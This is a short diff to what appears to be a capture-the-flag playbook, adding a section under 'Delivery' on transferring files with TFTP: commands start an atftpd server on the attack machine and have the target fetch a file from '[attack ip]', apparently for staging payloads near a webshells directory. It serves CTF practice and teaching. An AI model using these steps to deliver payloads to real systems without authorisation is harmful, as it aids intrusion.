@@ -312,7 +312,20 @@ cd /user/share/webshells/
 
 # Delivery 
 Deliver payload to the target, transfer files between target and attack machine.
-[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)
+[![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#exploitation)  
+
+__Transfer Files with TFTP__
+```bash
+# Start  atftpd setvice
+sudo service atftpd start
+atftpd --daemon --port 69 /tftp
+# Add your files to the service
+echo 'your information' >> /srv/tftp/filename.extension
+
+# Retreive file on target machine
+tftp [attack ip] GET filename.extension
+
+```
 
 __Transfer Files with FTP__  
 ```bash
